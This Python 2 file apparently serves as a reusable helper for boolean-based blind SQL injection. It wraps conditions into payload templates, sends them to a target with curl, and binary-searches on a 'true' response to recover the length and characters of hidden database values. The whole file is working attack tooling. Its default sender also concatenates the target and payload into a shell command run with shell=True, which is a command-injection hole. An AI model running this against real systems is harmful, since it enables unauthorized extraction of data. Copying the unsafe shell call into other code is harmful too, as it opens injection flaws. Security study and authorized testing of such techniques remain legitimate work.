import subprocess as sp

class BooleanBased:
    # The template of payload, replacing the variable $cond to real condition.
    payload = ""
    # The template of condition, replacing the variable $index and $guess.
    condition = ""
    # The response recv if the query condition is true.
    response = ""
    # The SQLi target.
    target = None
    # Debug option
    debug = False

    # The default method to send sqli payload to target, we can overwrite it in constructor if SQLi trigger point is unusual.
    def send_payload(self, payload):
        assert self.target != None, "The target is UNKNOWN."
        p = sp.Popen("curl " + self.target + payload, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
        return p.stdout.read()

    def __init__(self, payload, condition, response, send_payload = None, target = None, debug = None):
        self.payload = payload
        self.condition = condition
        self.response = response
        if send_payload != None:
            self.send_payload = send_payload

        self.target = target
        if debug != None:
            self.debug = debug
    
    def binsearch(self, a, b, index = None, num = False):
        orig_cond = self.condition
        orig_a = a
        orig_b = b
        if index != None:
            self.condition = self.condition.replace("$index", str(index))

        while b > a:
            found = False
            if (b - a) == 1:
                b = mid = a
            elif (a + b) % 2 == 0:
                mid = (a + b) / 2
            else:
                mid = (a + b) / 2 + 1

            if not num:
                cond = self.condition.replace("$guess", chr(mid))
            else:
                cond = self.condition.replace("$guess", str(mid))

            payload = self.payload.replace("$cond", cond)
            if self.debug:
                print payload
                raw_input()

            buf = self.send_payload(payload)
            if self.response in buf:
                found = True
                a = mid
            else:
                b = mid

        if num:
            errmsg = "Length is not in range %d ~ %d." % (orig_a, orig_b)
        else:
            errmsg = "Index %d character is not in range %d ~ %d." % (index, orig_a, orig_b)
        assert found , errmsg
        self.condition = orig_cond
        return mid

    def guess_length(self, minlen, maxlen):
        return self.binsearch(minlen, maxlen, num = True)

    def guess_text(self, length, verbose = False):
        text = ""
        for i in range(length):
            text += chr(self.binsearch(0x20, 0x80, index = i+1))
            if verbose:
                print ("index %3d: " + text) % (i+1)

        return text

    def guess_ascii(self, length, verbose = False):
        text = ""
        for i in range(length):
            text += chr(self.binsearch(0x20, 0x80, index = i+1, num = True))
            if verbose:
                print ("index %3d: " + text) % (i+1)

        return text
